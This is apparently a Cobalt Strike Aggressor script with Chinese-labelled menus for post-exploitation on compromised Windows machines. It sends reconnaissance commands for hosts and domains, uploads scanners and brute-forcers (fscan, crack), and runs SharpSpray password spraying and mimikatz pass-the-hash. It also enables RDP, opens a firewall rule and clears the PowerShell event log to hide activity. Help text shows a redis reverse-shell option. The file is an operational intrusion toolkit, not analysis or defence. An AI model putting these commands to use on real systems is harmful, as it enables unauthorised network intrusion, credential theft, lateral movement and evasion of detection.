menu "信息收集" {

	
	menu "单机常用命令" {
	item "systeminfo" {
			$bid = $1['@'];
			bshell($bid, "systeminfo");
		}
		item "whoami /all" {
			$bid = $1['@'];
			bshell($bid, "whoami /all");
		}
		item "ipconfig /all" {
			$bid = $1['@'];
			bshell($bid, "ipconfig /all");
		}
		item "查看路由表" {
			$bid = $1['@'];
			bshell($bid, "route print");
		}
		item "查看arp缓存" {
			$bid = $1['@'];
			bshell($bid, "arp -A");
		}
		item "查看用户信息" {
			$bid = $1['@'];
			bshell($bid, "net user");
		}
		item "查看安装程序和版本信息" {
			$bid = $1['@'];
			bshell($bid, "wmic product get name,version");
		}
		item "查看安装的补丁" {
			$bid = $1['@'];
			bshell($bid, "wmic qfe get Caption,Description,HotFixID,InstalledOn");
		}
		item "查看运行的进程及路径" {
			$bid = $1['@'];
			bshell($bid, "wmic process get caption,executablepath,commandline");
		}
		item "查看进程详细信息" {
			$bid = $1['@'];
			bshell($bid, "wmic process get caption,commandline,processid /value");
		}
		item "查看服务" {
			$bid = $1['@'];
			bshell($bid, "wmic service list brief");
		}
		item "查看防火墙配置" {
			$bid = $1['@'];
			bshell($bid, "netsh firewall show config");
		}
		item "查看计划任务" {
			$bid = $1['@'];
			bshell($bid, "schtasks.exe");
		}
		item "查看计划任务详情" {
			$bid = $1['@'];
			bshell($bid, "schtasks /query /fo LIST /v");
		}
		item "查看启动程序信息" {
			$bid = $1['@'];
			bshell($bid, "wmic startup get command,caption");
		}
		item "查看在线用户" {
			$bid = $1['@'];
			bshell($bid, "query user || qwinsta");
		}
		item "查看开机时间" {
			$bid = $1['@'];
			bshell($bid, "net statistics workstation");
		}
		item "查看powershell v5历史命令" {
			$bid = $1['@'];
			bshell($bid, "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
		}
		item "查看最近使用的项目" {
			$bid = $1['@'];
			bshell($bid, "dir %APPDATA%\\Microsoft\\Windows\\Recent");
		}
		item "查看SMB指向路径" {
			$bid = $1['@'];
			bshell($bid, "wmic share get name,path");
		}

	}
	separator();
	menu "域环境常用命令"{
	menu "AdFind(查询域内信息)" {
			item "上传AdFind" {
				$bid = $1;
				bupload($bid, script_resource("/modules/InfoCollection/AdFind.exe"));
			}
			item "列出域控制器名称" {
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -sc dclist");
			}
			item "查询当前域中在线的计算机" {
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -sc computers_active");
			}
			item "查询当前域中在线的计算机(只显示名称和操作系统)" {
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -sc computers_active name operatingSystem");
			}
			item "查询当前域中所有计算机" {
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -f \"objectcategory=computer\"");
			}
			item "查询当前域中所有计算机(只显示名称和操作系统)" {
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -f \"objectcategory=computer\" name operatingSystem");
			}
			item "查询域内所有用户" {
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -users name");
			}
			item "查询所有GPO" {
				$bid = $1['@'];
				bshell($bid, "AdFind.exe -sc gpodmp");
			}
			item "删除AdFind" {
				$bid = $1['@'];
				bshell($bid, "del /f /s /q AdFind.exe");
			}

		}
				item "查询域" {
			$bid = $1['@'];
			bshell($bid, "net view /domain");
		}
		item "查看域管" {
			$bid = $1['@'];
			bshell($bid, "net group \"domain admins\" /domain");
		}
		item "查看域用户详细信息" {
			prompt_text("输入域用户名", "", lambda({bshell(@bid, "net user $1 /domain");}, @bid => $bid));
		}
		item "查看当前登录域" {
			$bid = $1['@'];
			bshell($bid, "net config workstation");
		}
		item "查看时间服务器" {
			$bid = $1['@'];
			bshell($bid, "net time /domain");
		}
		item "显示当前域的计算机列表" {
			$bid = $1['@'];
			bshell($bid, "net view");
		}
		item "查看登录本机的域管" {
			$bid = $1['@'];
			bshell($bid, "net localgroup administrators /domain");
		}
		item "查看所有域用户" {
			$bid = $1['@'];
			bshell($bid, "net user /domain");
		}
		item "查看域内所有用户组列表" {
			$bid = $1['@'];
			bshell($bid, "net group /domain");
		}
		item "查看主域控制器" {
			$bid = $1['@'];
			bshell($bid, "netdom query pdc");
		}
		item "查看域控列表" {
			$bid = $1['@'];
			bshell($bid, "net group \"Domain Controllers\" /domain");
		}
		item "查看域控主机名" {
			$bid = $1['@'];
			bshell($bid, "Nslookup -type=SRV _ldap._tcp");
		}
		item "获取域信任信息" {
			$bid = $1['@'];
			bshell($bid, "nltest /domain_trusts");
		}
		item "获取域密码信息" {
			$bid = $1['@'];
			bshell($bid, "net accounts /domain");
		}
		item "查看所有域成员计算机列表" {
			$bid = $1['@'];
			bshell($bid, "net group \"domain computers\" /domain");
		}
		item "查看域内所有计算机" {
			prompt_text("输入主机名", "", lambda({bshell(@bid, "net view /domain:$1");}, @bid => $bid));
		}


	}


	item "SharpChassisType(判断主机类型)" {
		$bid = $1['@'];
		$dialog = dialog("SharpNetCheck", %(bid => $bid), &SharpChassisType);
		dialog_description($dialog,"用于判断当前机器类型(桌面计算机、笔记本等判断)。项目地址：https://github.com/RcoIl/CSharp-Tools/");
		dbutton_action($dialog, "运行");
		dialog_show($dialog);
	}
	sub SharpChassisType{
	    bexecute_assembly($bid, script_resource("/modules/InfoCollection/SharpChassisType.exe"), "");
	}

	item "SharpNetCheck(探测出网)" {
		$bid = $1['@'];
		$dialog = dialog("SharpNetCheck", %(host => "ceye.io",,type => "all",bid => $bid), &SharpNetCheck);
		dialog_description($dialog,"在内网渗透过程中，对可以出网的机器是十分渴望的。在收集大量弱口令的情况下，一个一个去测试能不能出网太麻烦了。所以就有了这个工具，可配合如wmiexec、psexec等横向工具进行批量检测，该工具可以在dnslog中回显内网ip地址和计算机名，可实现内网中的快速定位可出网机器。项目地址：https://github.com/uknowsec/SharpNetCheck");
		drow_combobox($dialog, "type", "-dns/-http/all", @("-dns", "-http","all"));
		drow_text($dialog, "host", "host/ip:  ");
		dbutton_action($dialog, "运行");
		dialog_show($dialog);
	}
	sub SharpNetCheck {
		$arg = join(' ', @($3['type'],"-host",$3['host']));
		show_message($args);
		bexecute_assembly($bid, script_resource("/modules/InfoCollection/SharpNetCheck.exe"), $arg);
	}

	item "SharpEventLog(获取系统登录日志)" {
		$bid = $1;
		$dialog = dialog("SharpEventLog", %(EventLogType => "-4624",bid => $bid), &SharpEventLog);
		dialog_description($dialog, "读取登录过本机的登录失败或登录成功（4624，4625）的所有计算机信息，在内网渗透中快速定位运维管理人员。项目地址：https://github.com/uknowsec/SharpEventLog");
		drow_combobox($dialog, "EventLogType", "EventLog Type:", @("-4624", "-4625"));
		dbutton_action($dialog, "运行");
		dialog_show($dialog);
	}
	sub SharpEventLog {
		bexecute_assembly($bid, script_resource("/modules/InfoCollection/SharpEventLog.exe"), $3['EventLogType']);
	}

	item "SharpCheckInfo(获取多项主机信息)" {
		$bid = $1;
		$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpCheckInfo);
		dialog_description($dialog, "收集目标主机信息，包括最近打开文件，系统环境变量和回收站文件等等。项目地址：https://github.com/uknowsec/SharpCheckInfo");
		drow_combobox($dialog, "Type", "Type:", @("-All", "-EnvironmentalVariables","-GetRecycle","-AllUserDirectories","-PowershellInfo","-CsharpVersion","-AvProcessEDRproduct","-Defender","-RecentFiles","-NetworkConnentions","-ApplockerEnumerating","-Drives","-LAPS"));
		dbutton_action($dialog, "运行");
		dialog_show($dialog);
	}
	sub SharpCheckInfo {
		bexecute_assembly($bid, script_resource("/modules/InfoCollection/SharpCheckInfo.exe"), $3['Type']);
	}

	item "SharpSQLDump(快速列出数据库数据)" {
		$bid = $1['@'];
		$dialog = dialog("SharpSQLDump", %(host => "",username => "",password => "",type => "mysql",bid => $bid), &SharpSQLDump);
		dialog_description($dialog, "内网渗透中快速获取数据库所有库名，表名，列名。具体判断后再去翻数据，节省时间。适用于mysql，mssql。项目地址：https://github.com/uknowsec/SharpSQLDump");
		drow_text($dialog, "host", "host:  ");
		drow_text($dialog, "username", "username:  ");
		drow_text($dialog, "password", "password:  ");
		drow_combobox($dialog, "type", "-mysql/-mssql", @("-mysql", "-mssql"));
		dbutton_action($dialog, "运行");
		dialog_show($dialog);
	}
	sub SharpSQLDump {
		$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type']));
		bexecute_assembly($bid, script_resource("/modules/InfoCollection/SharpSQLDump.exe"), $arg);
	}

	item "SharpClipHistory(获取win10剪切板)" {
		$bid = $1;
		$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpClipHistory);
		dialog_description($dialog, "可用于从1809 Build版本开始读取Windows 10中用户剪贴板历史记录的内容。空白类型选项表示读取。项目地址：https://github.com/FSecureLABS/SharpClipHistory");
		drow_combobox($dialog, "Type", "Type:", @("--help","","--checkOnly","--enableHistory","--saveImages","--keepassBypass"));
		dbutton_action($dialog, "运行");
		dialog_show($dialog);
	}
	sub SharpClipHistory {
		bexecute_assembly($bid, script_resource("/modules/InfoCollection/SharpClipHistory.exe"), $3['Type']);
	}

	item "SharpAVKB(杀软和补丁对比)" {
		$bid = $1;
		$dialog = dialog("SharpAVKB", %(type => "-AV",bid => $bid), &SharpAVKB);
		dialog_description($dialog, "Windows杀软对比和补丁号对比。项目地址：https://github.com/uknowsec/SharpAVKB");
		drow_combobox($dialog, "type", "type:", @("-AV", "-KB"));
		dbutton_action($dialog, "运行");
		dialog_show($dialog);
	}
	sub SharpAVKB {
		bexecute_assembly($bid, script_resource("/modules/InfoCollection/SharpAVKB.exe"), $3['type']);
	}

	item "SharpEDRChecker(获取EDR信息)" {
		$bid = $1['@'];
		btask($bid, "检查正在运行的进程，进程元数据，加载到当前进程中的Dll以及每个DLL元数据，通用安装目录，已安装的服务和每个服务二进制元数据，已安装的驱动程序和每个驱动程序元数据，所有这些都存在已知的防御性产品，例如AV，EDR和日志记录工具。还可以通过其元数据检查来捕获隐藏的EDR。项目地址：https://github.com/PwnDexter/SharpEDRChecker", "");
		bexecute_assembly($1, script_resource("/modules/InfoCollection/SharpEDRChecker.exe"), "");
	}

	item "SharpDir(文件搜索)" {
		$bid = $1['@'];
		$dialog = dialog("文件搜索", %(path => "C:\\",file => "payload.exe||passwords*||*.txt",bid => $bid), &SharpDir);
		dialog_description($dialog, "文件搜索，三种搜索方式，指定文件名、制定文件名搜索后缀、搜索指定后缀文件。项目地址：https://github.com/jnqpblc/SharpDir");
		drow_text($dialog, "path", "path:  ");
		drow_text($dialog, "file", "file:  ");
		dbutton_action($dialog, "运行");
		dialog_show($dialog);
	}
	sub SharpDir {
		$arg = join(' ', @($3['path'],$3['file']));
		bexecute_assembly($bid, script_resource("/modules/InfoCollection/SharpDir.exe"), $arg);
	}
	separator();


menu "Everything(建立http服务文件搜索)" {
		item "上传Everything" {
			$bid = $1;
			$dialog = dialog("上传 Everything", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &evething);
			dialog_description($dialog, "运行无任何弹窗，软件地址：https://www.voidtools.com/zh-cn/");
			drow_text($dialog, "UploadPath",  "上传路径: ");
			dbutton_action($dialog, "上传");
			dialog_show($dialog);
		}
		sub evething {
			if (-is64 $bid['id']) {
				bupload($bid, script_resource("/modules/InfoCollection/x64/Everything.exe"));
				bupload($bid, script_resource("/modules/InfoCollection/x64/Everything.ini"));
			}else{
				bupload($bid, script_resource("/modules/InfoCollection/x86/Everything.exe"));
				bupload($bid, script_resource("/modules/InfoCollection/x86/Everything.ini"));
			}
		}

		item "运行Everything"{
			$bid = $1['@'];
			$Dialog = dialog("运行Evething",%(bid => $bid),&Evething_run);
			dialog_description($Dialog, "运行无任何弹窗及托盘显示，自动启用http服务。端口：65536，用户：admin，密码：admin@123");
			dbutton_action($Dialog, "运行");
			dialog_show($Dialog);
		}
		sub Evething_run{
			bshell($bid, "Everything.exe");
		}
		item "停止Everything"{
			local('$bid');
			foreach $bid ($1){
				bshell($1, "taskkill -f /im Everything.exe");
			}
		}
		item "删除Everything"{
			local('$bid');
			foreach $bid ($1){
				bshell($1, "taskkill -f /im Everything.exe & del /f /s /q Everything.exe & del /f /s /q Everything.ini");
			}
		}
	}

	menu "定位域管" {
  menu "PsLoggedon" {
    item "上传PsLoggedon" {
      $bid = $1;
      $dialog = dialog("上传 PsLoggedon", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &PsLoggedon);
      dialog_description($dialog, "微软官方工具，该工具的某些功能需要管理员权限。项目地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon");
      drow_text($dialog, "UploadPath",  "上传路径: ");
      dbutton_action($dialog, "上传");
      dialog_show($dialog);
    }
    sub PsLoggedon{
			if (-is64 $bid['id']) {
				bupload($bid, script_resource("/modules/InfoCollection/LocalAd/x64/PsLoggedon.exe"));
			}else{
				bupload($bid, script_resource("/modules/InfoCollection/LocalAd/x86/PsLoggedon.exe"));
			}
    }
    item "运行PsLoggedon"{
      bshell($bid, "PsLoggedon.exe");
      bshell($bid, "PsLoggedon64.exe");
    }
    item "删除PsLoggedon"{
      local('$bid');
      foreach $bid ($1){
        bshell($1, "del /f /s /q PsLoggedon.exe");
        bshell($1, "del /f /s /q PsLoggedon64.exe");
      }
    }
  }

  item "PVEFindADUser" {
    bexecute_assembly($1, script_resource("/modules/InfoCollection/LocalAd/PVEFindADUser.exe"),"-current");
    bshell($1, "del /f /s /q report.csv");
  }

  menu "netview" {
    item "上传netview" {
      $bid = $1;
      $dialog = dialog("上传netview", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &netview);
      dialog_description($dialog, "绝大部分功能不需要管理员权限。项目地址：https://github.com/mubix/netview");
      drow_text($dialog, "UploadPath",  "上传路径: ");
      dbutton_action($dialog, "上传");
      dialog_show($dialog);
    }
    sub netview {
      bupload($bid, script_resource("/modules/InfoCollection/LocalAd/netview.exe"));
    }
    item "运行netview"{
      $bid = $1['@'];
      $Dialog = dialog("运行netview",%(domain => "xxx.com",bid => $bid),&netview_run);
      drow_text($Dialog, "domain", "domain: ");
      dbutton_action($Dialog, "运行");
      dialog_show($Dialog);
    }
    sub netview_run{
      local('$Name');
      $Name = $3['domain'];
      bshell($bid, "netview.exe -d   $+ $Name");
    }
    item "删除netview"{
      local('$bid');
      foreach $bid ($1){
        bshell($1, "del /f /s /q netview.exe");
      }
    }
  }



}

	 item "OXID解析地址"{
  	$dialog = dialog("OXID",%(bid => $1["@"] , netversion => "4.0" , IP => "192.168.10.1/24") ,&OXID);
		dialog_description($dialog,"通过OXID获取远程主机网卡地址");
		drow_combobox($dialog,"netversion","版本:",@("4.0","3.0"));
		drow_text($dialog,"IP","IP:");
		dbutton_action($dialog,"Exploit");
		dialog_show($dialog);
	}
	separator();
	item "CheckAV" {
		bshell($1,"wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed");
	}

	separator();
	menu "内网探测" {

	item "SharpWebScan(探测web服务)" {
    $bid = $1['@'];
    $dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,443,7001,8000,8001,8080,8888",bid => $bid), &SharpWebScan);
    dialog_description($dialog, "扫描IP或C段的Web服务，获取Title，可自定义多端口扫描，返回web地址和title。项目地址：https://github.com/RcoIl/CSharp-Tools/tree/master/SharpWebScan");
    drow_text($dialog, "ip", "ip:  ");
    drow_text($dialog, "port", "ports:  ");
    drow_combobox($dialog, "iptype", "-ip/-cip", @("-IP", "-CIP"));
    dbutton_action($dialog, "运行");
    dialog_show($dialog);
  }
  sub SharpWebScan {
    $arg = join(' ', @($3['iptype'],$3['ip'],$3['port']));
    bexecute_assembly($bid, script_resource("/modules/InfoCollection/NetScan/SharpWebScan.exe"), $arg);
  }

  menu "TailorScan(缝合怪内网扫描器)" {
    item "上传TailorScan" {
      $bid = $1;
      $dialog = dialog("上传TailorScan", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &TailorScan);
      dialog_description($dialog, "支持端口扫描，识别服务，获取title，扫描多网卡，ms17010扫描，icmp存活探测。项目地址：https://github.com/uknowsec/TailorScan");
      drow_text($dialog, "UploadPath",  "上传路径: ");
      dbutton_action($dialog, "上传");
      dialog_show($dialog);
    }
    sub TailorScan {
      if (-is64 $bid['id']) {
        bupload($bid, script_resource("/modules/InfoCollection/NetScan/x64/TailorScan.exe"));
      }else{
        bupload($bid, script_resource("/modules/InfoCollection/NetScan/x86/TailorScan.exe"));
      }
    }
    item "运行TailorScan"{
			$bid = $1['@'];
      btask($bid, " ", "");
      btask($bid, "TailorScan.exe", "");
      btask($bid, " ", "");
      btask($bid, "扫描IP格式支持：", "");
      btask($bid, "   192.168.1.1", "");
      btask($bid, "   192.168.1.1-10", "");
      btask($bid, "   192.168.1.*", "");
      btask($bid, "   192.168.1.0/24", "");
      btask($bid, " ", "");
      btask($bid, "端口支持自定义列表，用','分隔，如：", "");
      btask($bid, "   21,22,80-99,8000-8080", "");
      btask($bid, " ", "");
      btask($bid, "端口扫描，支持tcp、icmp:", "");
      btask($bid, "   TailorScan.exe portscan 192.168.0.1/24 80,8080 tcp", "");
      btask($bid, "   TailorScan.exe portscan 192.168.0.1/24 tcp", "");
      btask($bid, " ", "");
      btask($bid, "永恒之蓝探测：", "");
      btask($bid, "   TailorScan.exe ms17010 -i 192.168.0.1", "");
      btask($bid, "   TailorScan.exe ms17010 -n 192.168.0.1/24", "");
      btask($bid, " ", "");
      btask($bid, "OXID Find：", "");
      btask($bid, "   TailorScan.exe oxidfind -i 192.168.0.1", "");
      btask($bid, "   TailorScan.exe oxidfind -n 192.168.0.1/24", "");
      btask($bid, " ", "");
      btask($bid, "ICMP check：", "");
      btask($bid, "   TailorScan.exe icmpcheck 192.168.0.1/24", "");
      btask($bid, " ", "");
			$dialog = dialog("运行TailorScan",%(exec => "TailorScan.exe ms17010 -n 192.168.0.1/24", bid => $bid),&TailorScan_run);
			dialog_description($dialog, "注意控制台输出的使用说明，直接在下方输入执行指令：");
      drow_text($dialog, "exec", "Exec: ");
			dbutton_action($dialog, "运行");
			dialog_show($dialog);
		}
		sub TailorScan_run{
      $exec = $3['exec'];
			bshell($bid, "$exec");
		}
    item "删除TailorScan"{
			$bid = $1['@'];
      bshell($bid, "taskkill -f /im TailorScan.exe & del /f /s /q TailorScan.exe");
    }
  }

  menu "fscan" {
    item "上传fscan" {
      $bid = $1;
      $dialog = dialog("上传fscan", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &fscan);
      dialog_description($dialog, "经测试若有360会被杀，支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写私钥、计划任务反弹shell、读取win网卡信息等。项目地址：https://github.com/shadow1ng/fscan");
      drow_text($dialog, "UploadPath",  "上传路径: ");
      dbutton_action($dialog, "上传");
      dialog_show($dialog);
    }
    sub fscan {
      bupload($bid, script_resource("/modules/InfoCollection/NetScan/fscan.exe"));
    }
    item "运行fscan"{
			$bid = $1['@'];
      btask($bid, "简单用法：", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24                      (默认使用全部模块)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub       (redis 写私钥)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24 -c whoami            (ssh 爆破成功后，命令执行)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24 -m ssh -p 2222       (指定模块ssh和端口)", "");
      btask($bid, "fscan.exe -h 192.168.1.1/24 -m ms17010           (指定模块)", "");
      btask($bid, " ", "");
      btask($bid, "-h 192.168.1.1/24 (C段)", "");
      btask($bid, "-h 192.168.1.1/16 (B段)", "");
      btask($bid, "-h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息)", "");
      btask($bid, "-hf ip.txt        (以文件导入)", "");
      btask($bid, " ", "");
      btask($bid, "fscan.exe -h      (查看完整使用方法)", "");
      btask($bid, " ", "");
      $dialog = dialog("运行fscan",%(exec => "fscan.exe -h 192.168.1.1/24", bid => $bid),&fscan_run);
			dialog_description($dialog, "注意控制台输出的使用说明，直接在下方输入执行指令：");
      drow_text($dialog, "exec", "Exec: ");
			dbutton_action($dialog, "运行");
			dialog_show($dialog);
		}
    sub fscan_run{
      $exec = $3['exec'];
			bshell($bid, "$exec");
		}
    item "删除fscan"{
			$bid = $1['@'];
      bshell($bid, "taskkill -f /im fscan.exe & del /f /s /q fscan.exe");
    }
  }


  menu "crack爆破" {
    item "上传crack" {
      $bid = $1;
      $dialog = dialog("上传crack", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &crack);
      dialog_description($Dialog, "支持爆破ftp，ssh，smb，mssql，mysql, postgresql,爆破完毕会在当前目录生成result.txt。fork地址：https://github.com/oksbsb/crack");
      drow_text($dialog, "UploadPath",  "上传路径: ");
      dbutton_action($dialog, "上传");
      dialog_show($dialog);
    }
    sub crack {
      bupload($bid, script_resource("/modules/InfoCollection/NetScan/crack.exe"));
    }
    item "运行crack"{
      $bid = $1['@'];
      btask($bid, " ", "");
      btask($bid, "-i string", "");
      btask($bid, "   ip addr 192.168.1.1/24，192.168.1-255，192.168.1.1", "");
      btask($bid, "-p string", "");
      btask($bid, "   port 21,22，445，3306，1433", "");
      btask($bid, "-U string", "");
      btask($bid, "   filename list or username", "");
      btask($bid, "-P string", "");
      btask($bid, "   filename list or username", "");
      btask($bid, "-s string", "");
      btask($bid, "   service ftp  ssh，smb，mssql，mysql, postgresql   default  only scan tcp port (default \"scan\")", "");
      btask($bid, "-t int", "");
      btask($bid, "   thread (default 100)", "");
      btask($bid, " ", "");
      $Dialog = dialog("运行crack",%(ip => "192.168.1.1/24", port => "445", username => "filename list or username", password => "filename list or password", type => "smb", thread => "100",bid => $bid),&crack_run);
      dialog_description($Dialog, "支持爆破ftp，ssh，smb，mssql，mysql, postgresql,爆破完毕会在当前目录生成result.txt。");
      drow_text($Dialog, "ip", "ip: ");
      drow_text($Dialog, "port", "port: ");
      drow_text($Dialog, "username", "username: ");
      drow_text($Dialog, "password", "password: ");
      drow_text($Dialog, "type", "type: ");
      drow_text($Dialog, "thread", "thread: ");
      dbutton_action($Dialog, "运行");
      dialog_show($Dialog);
    }
    sub crack_run{
      local('$Name $port $username $password $type $thread');
      $Name = $3['ip'];
      $port = replace($3['port'], "\"", "");
      $username = $3['username'];
      $password = $3['password'];
      $type = $3['type'];
      $thread = $3['thread'];
      bshell($bid, "crack.exe -i  $+ $Name -p  $+ $port -U  $+ $username -P  $+ $password -s  $+ $type -t  $+ $thread");
    }
    item "删除crack"{
      local('$bid');
      foreach $bid ($1){
        bshell($1, "taskkill -f /im crack.exe & del /f /s /q crack.exe");
      }
    }
  }

  item "SharpSpray(域内密码爆破)" {
    $bid = $1['@'];
    $dialog = dialog("SharpSpray", %(passwd => "123,888",Delay => "1000",Sleep => "1",bid => $bid), &SharpSpray);
    dialog_description($dialog, "使用LDAP对域的所有用户执行密码喷雾攻击。seeds：指定几个密码生成字典，逗号分隔。passwords：指定密码爆破，可多个密码，逗号分隔。delay：密码喷雾的延迟，毫秒为单位。sleep：密码猜测之间sleep周期分钟数。项目地址：https://github.com/jnqpblc/SharpSpray");
    drow_combobox($dialog, "type", "type:", @("--Seeds","--Passwords"));
    drow_text($dialog, "passwd", "passwd:  ");
    drow_text($dialog, "Delay", "Delay:  ");
    drow_text($dialog, "Sleep", "Sleep:  ");
    dbutton_action($dialog, "运行");
    dialog_show($dialog);
  }
  sub SharpSpray {
    $arg = join(' ',  @($3['type'],$3['passwd'],"--Sleep",$3['Sleep'],"--Delay",$3['Delay']));
    bexecute_assembly($bid, script_resource("/modules/InfoCollection/NetScan/SharpSpray.exe"), $arg);
  }

  item "Mimikatz-pth"{
    local('$bid');
    foreach $bid ($1){
      mimikatz_passthehash($bid);
    }
  }
  sub mimikatz_passthehash{
  	$bid = $1;
  	$dialog = dialog("Pass-The-Hash" , %(beacon => $1 , domain => "xxx.com" , user => "administrator" , hash => "hash") , lambda({
      bpassthehash($3["beacon"] , $3["domain"] , $3["user"] , $3["hash"]);
  	}));
  	dialog_description($dialog, "mimikatz哈希传递攻击。");
  	drow_text($dialog, "beacon",  "Beacon:");
  	drow_text($dialog, "domain",  "Domain:");
  	drow_text($dialog, "user",  "User:");
  	drow_text($dialog, "hash",  "Hash:");
  	dbutton_action($dialog, "Launch");
  	dialog_show($dialog);
  }
	}
	separator();
	menu "RDP相关" {

	item "获取RDP端口" {
    local('$bid');
    foreach $bid ($1){
      blog($1, "Check Rdp Open Port");
      bpowershell_import($bid, script_resource("/modules/InfoCollection/NetScan/RDP/RegRdpPort.ps1"));
      bpowerpick($bid,"RegRdpPort");
      bshell($bid,"wevtutil cl \"Windows PowerShell\"");
    }
  }
  item "查看RDP是否开启" {
    blog($1, "请手动执行：shell netstat -ano | findstr \$RDP端口")
  }

  item "开启RDP服务" {
    $bid = $1['@'];
    bshell($bid, "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f");
    bshell($bid, "wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1");
  }

  item "关闭RDP服务" {
    $bid = $1['@'];
    bshell($bid, "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 1 /f");
    bshell($bid, "wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0");
  }

  item "防火墙放行RDP规则" {
    $bid = $1['@'];
    bshell($bid, "netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow");
	}
	}
}

sub OXID{
	if ($3["netversion"] eq "4.0")
	{
		bexecute_assembly($3["bid"],script_resource("/modules/InfoCollection/OXID/net4.0/OXID_Find.exe"),"-c   $+ $3['IP']");
	}

	if ($3["netversion"] eq "3.0")
	{
		bupload($3["bid"],script_resource("/modules/InfoCollection/OXID/net3.0/OXID_Find.exe"));
		$command = "OXID_Find.exe -c " . $3["IP"];

		bshell($3["bid"],$command);

	}
}